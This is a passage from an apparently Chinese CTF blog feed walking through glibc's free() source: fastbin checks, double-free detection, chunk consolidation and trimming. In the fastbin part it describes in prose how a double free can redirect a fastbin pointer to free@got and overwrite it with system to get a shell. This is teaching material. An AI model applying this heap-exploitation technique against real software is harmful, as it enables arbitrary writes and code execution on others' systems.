chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! have_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个大条件很明显就是判断这个<code>free</code>的<code>chunk</code>是否为<code>fast bin</code>，后面又判断且这个<code>chunk</code>的后一个<code>chunk</code>不为<code>top_chunk</code>，虽然根据自己的经验好像判断后一个不为<code>top_chunk</code>没什么意义。</p><p>然后满足的话就是一个<code>check</code>，判断<code>size</code>是否小于<code>MINSIZE</code>或者是<code>size&gt;=system_mem</code>。就是排除一些不合理的情况然后会重新尝试拿分配器的锁然后再做一个判断，如果刚刚那个条件还是成立的话那就说明<code>size</code>真的被改成了非法数值，那就报错退出。</p><p>如果进来了但是没有执行报错呢，说明可能多线程有点问题，就释放这个<code>arena</code>的锁，这里我多线程不是很好也不知道该如何解释，但是这个应该不是主要分析的，咱们平时做题基本也不会遇到多线程编程的题目。</p><h4 id="free-fast-bin"><a href="#free-fast-bin" class="headerlink" title="free fast bin"></a>free fast bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">        (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">        size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">        only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它先执行了一个<code>free_perturb</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free_perturb</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实跟前面<code>malloc</code>那个函数差不多，就是看你有没有设置那个值，如果设置了就在<code>free</code>之前把堆块进行<code>memset</code>清空，但是不一样的是，<code>perturb</code>中<code>memset</code>第二个参数是要根据你设置的值再异或一个<code>0xff</code>的。</p><p>然后是用<code>set_fastchunks(av)</code>宏定义去初始化<code>fast bin</code>。之后根据<code>size</code>算出下标找到对应的<code>fast bin</code>，之后就应该把这个<code>free</code>的<code>chunk</code>链入<code>fast bin</code>里面。这里还有一个<code>check</code>，如果<code>bin</code>顶部的那个<code>chunk</code>和这次要<code>free</code>的<code>chunk</code>相等的话，就报错退出，这也就是我们熟知的<code>double free</code>漏洞了。那么说到<code>double free</code>我们来看看<code>double free</code>能造成什么后果。</p><p>假如我要<code>free</code>的<code>chunk</code>是A，我第一次<code>free</code> A，<code>bin</code>为空，链入其中，<code>fast bin</code>中多了一个A。第二次<code>free</code> A，A再次被加入<code>fast bin</code>中，然后会导致产生一个自己指向自己的指针。<code>fast bin</code>中的情况就是两个A，<code>A-&gt;A</code>。此时我申请一个和A一样大的<code>chunk</code>，A被申请走，<code>fast bin</code>中还剩下一个A，但是此时用户手里有一个A，<code>fast bin</code>中也有一个A。用户可以直接编辑A的指针域，比如我让它指向了<code>got</code>表中的<code>free</code>函数。那么此时<code>fast bin</code>中的情况就是<code>A-&gt;free@got</code>。然后我再次申请和A一样大小的<code>chunk</code>，A被取出来，<code>fast bin</code>中剩下<code>free@got</code>。那么我第三次申请就得到了在<code>free@got</code>那边的<code>chunk</code>，然后假如我偷偷修改一下<code>free@got</code>为<code>system</code>，那就能轻松<code>get shell</code>了。这里可以看到，<code>free@got</code>这个指针我是能任意编辑的，也就是说我想申请到哪都不是问题，这样我就能任意地址写了。</p><p>你可能有点疑问，我<code>free</code>了2个堆块，怎么出来3个堆块。那我们想想，如果遍历一个单链表，你怎么判断结尾？咱们一般都是判断<code>x-&gt;next!=NULL</code>但是原来那边A的<code>next</code>指针确实是<code>NULL</code>，但是你把指针改过了，就会认为<code>fast bin</code>还没有空。</p><p>但是实际情况往往没有那么简单，前面我们说过了，<code>malloc</code>取出一个<code>fast bin</code>的<code>chunk</code>的时候，会判断它<code>chunk</code>的<code>size</code>是否等于当前我要申请的<code>size</code>，如果不是就会报错退出。所以<code>double free</code>在利用的时候还是没那么”任意”的，而且这里也不允许你直接<code>double free</code>，但是直接不能不代表不能间接<code>double free</code>，如果我先<code>free</code>一个A，<code>free</code>一个B之后再<code>free</code>一个A，那么我再申请到A的时候修改A的指针域一样可以劫持，并且可以绕过这里的检测。</p><p>然后如果过了检测，那就将这个<code>chunk</code>假如<code>fast bin</code>的顶部。这里就是一个单链表的插入，具体自己写的话应该是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=av-&gt;fastbinY[index]-&gt;fd;</span><br><span class="line">av-&gt;fastbinY[index]-&gt;fd=p;</span><br></pre></td></tr></table></figure><p>源码中与这个略微有点不一样，效果是一样的。所以也可以看出来这个是后进先出，只在<code>fast bin</code>的一端插入删除，跟栈差不多。</p><p>末尾还有一个<code>check</code>，但是这个<code>check</code>通常不会被触发，有会的师傅也请帮帮，因为是真的不知道hhh。</p><h4 id="free非fast-bin"><a href="#free非fast-bin" class="headerlink" title="free非fast bin"></a>free非fast bin</h4><p>这里分了两种情况，如果<code>chunk</code>是<code>mmap</code>分配的话那就调用<code>munmap_chunk</code>函数去<code>free</code>这个<code>chunk</code>，这个情况不属于我们主要要分析的内容，所以那边的else分支我们跳过，只分析非<code>mmap</code>分配的<code>chunk</code>。</p><h4 id="第一部分：锁"><a href="#第一部分：锁" class="headerlink" title="第一部分：锁"></a>第一部分：锁</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    assert (locked);</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这我熟，就是在用一个分配器的时候先加锁，用完了释放就行了。这主要是为了防止多个线程之间发生竞争，虽然我看过多线程是说有独立的堆空间，但是假设堆块正常使用，正常分配，不去做指针的越界操作，那么同一个分配器分配给不同的线程用也是完全可行的，我只拿到我自己用的指针在合法范围内用一样不会造成竞争的现象。以上出于我自己的大胆推测，如有不对还请指正。</p><h4 id="第二部分：free之前的各种check"><a href="#第二部分：free之前的各种check" class="headerlink" title="第二部分：free之前的各种check"></a>第二部分：free之前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<span class="comment">//后面块的prev in use标志位为0时发生free</span></span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>好，我们来看第一个<code>check</code>。</p><ol><li><code>p == av-&gt;top</code>：<code>free</code>的<code>chunk</code>为<code>top_chunk</code>。</li></ol><p><code>top_chunk</code>和其它<code>bin</code>一样，都是出于待分配状态，<code>top_chunk</code>永远不会被使用。因为如果切割了<code>top_chunk</code>，<code>top_chunk</code>马上会下移，所以正常分配是绝对不会分配到现在的<code>top_chunk</code>指针的，所以当你尝试<code>free</code> <code>top_chunk</code>的时候，就会报这个错。</p><p>第二个<code>check</code></p><ol><li><code>contiguous (av)</code>：检查分配器上的<code>flags</code>，其实我也不知道是干嘛的(捂脸。</li><li><code>(char *) nextchunk&gt;=(char *) av-&gt;top + chunksize(av-&gt;top)</code>：然后这个条件呢就是说如果我这个<code>chunk</code>的下一个<code>chunk</code>居然在<code>top_chunk</code>之后，那肯定就也有错了。</li></ol><p>第三个<code>check</code></p><ol><li><code>!prev_inuse(nextchunk)</code>：就是说如果后一个<code>chunk</code>的<code>prev_inuse</code>为0，也就是说这个<code>chunk</code>处于被<code>free</code>的状态，那么这一次<code>free</code>就有可能造成<code>double free</code>了，就会报错。</li></ol><p>第四个<code>check</code></p><ol><li><code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>：如果下一个<code>chunk</code>的<code>size</code>有问题一样也要报错退出，这里说的就是下一个<code>chunk</code>的<code>size</code>小于<code>MINSIZE</code>的情况，free的话因为会涉及到chunk的向前合并或者向后合并，因此对前后堆块的检查都很严格。</li><li><code>nextsize &gt;= av-&gt;system_mem</code>：<code>size</code>超出系统分配给分配器的内存，那也报错。</li></ol><h4 id="第三部分：free之后向前合并"><a href="#第三部分：free之后向前合并" class="headerlink" title="第三部分：free之后向前合并"></a>第三部分：free之后向前合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就提到了我们之前讲到的一个问题，我一个堆块怎么向前合并，也就是如何准确地找到前一个堆块。向前合并的时候我先判断一下前一个<code>chunk</code>是否被使用，如果不被使用那么就要和前面的<code>chunk</code>合并。这里我就可以通过<code>prev_size</code>位去找到这个堆块，用自身指针减去<code>prev_size</code>就得到了前一个<code>chunk</code>的指针。</p><p>这里需要注意，因为前面那个<code>chunk</code>可能在<code>large bin</code>,<code>small bin</code>或者是<code>unsorted bin</code>的链表当中，那么我就得先把它从这些<code>bin</code>里面解脱出来，也就是<code>unlink</code>操作，合并之后成为一个新的<code>chunk</code>然后再加入<code>unsorted bin</code>。</p><p>这里向前合并的操作呢应该也没有很复杂，就是改个<code>size</code>然后把<code>free</code>的指针指到前面去，相当于是要<code>free</code>合并后的<code>chunk</code>了。然后<code>unlink</code>把前面的<code>chunk</code>在<code>bin</code>中删除。</p><h4 id="第四部分：free之后向后合并"><a href="#第四部分：free之后向后合并" class="headerlink" title="第四部分：free之后向后合并"></a>第四部分：free之后向后合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个特判后面的<code>chunk</code>是否为<code>top_chunk</code>，<code>top_chunk</code>的情况就非常简单，因为合并的<code>chunk</code>并不在任何<code>bin</code>里面，<code>top_chunk</code>后面也没有堆块不需要设置标志位。只需要改一下<code>top_chunk</code>的<code>size</code>，然后改一下指针，就完了。</p><p>那么我们分析不是<code>top_chunk</code>的情况，首先我先获取一下下一个<code>chunk</code>的是否被使用，如果没有被使用，那么把后面的<code>chunk</code>就先<code>unlink</code>了，然后自己<code>chunk</code>的<code>size</code>加上后面那个<code>chunk</code>的<code>size</code>成为新的<code>chunk</code>。否则，我就直接清空后面<code>chunk</code>的<code>prev_inuse</code>位，就是表示我这个<code>chunk</code>已经不被使用了。好了之后那就是把这个<code>chunk</code>链入<code>unsorted bin</code>。这里还有一个<code>check</code>，跟<code>malloc</code>那个一样，，后面基本也都一样了，就不细讲了，链入，设置标记为，设置<code>prev_size</code>，如果不在<code>small chunk</code>的大小还会清空<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，如果不理解可以往上翻一下看看。目录标题为“最后一小块”，那边是切割<code>bin</code>的时候设置的。</p><h4 id="第五部分：最后的处理"><a href="#第五部分：最后的处理" class="headerlink" title="第五部分：最后的处理"></a>第五部分：最后的处理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">            systrim(mp_.top_pad, av);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如注释所说，如果我一次释放了一个很大的空间(<code>0x10000B</code>)，那么会调用<code>malloc_consolidate</code>合并所有<code>fast bin</code>，如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用<code>systrim</code>收缩内存，否则就获得非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>收缩<code>heap</code>。因为我们认为一次<code>free</code>很大的空间那么操作系统可以适当回收点内存了，大不了等你不够就再像我要嘛，资源的合理配置，很合理。</p><p>至此，<code>free</code>部分的源码也都分析完啦。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>就不向<code>malloc</code>一样描述具体步骤了，因为本身逻辑没有很复杂。主要就是<code>free</code>非<code>fast bin chunk</code>的向前合并或者向后合并。</p><p><code>free</code>在<code>fast bin</code>范围内的<code>chunk</code>，直接将<code>chunk</code>链入<code>fast bin</code>，<code>free</code>非<code>fast bin</code>范围的<code>chunk</code>视具体情况向前合并或者向后合并然后加入<code>unsorted bin</code>，如果一次<code>free</code>太多的空间有可能会被操作系统回收。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>源码分析也就完结撒花了，后续可能会出heap的各种利用方式和利用手段，或者局部分析其它版本的libc。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分块入门2</title>
      <link href="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/"/>
      <url>/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/</url>
      
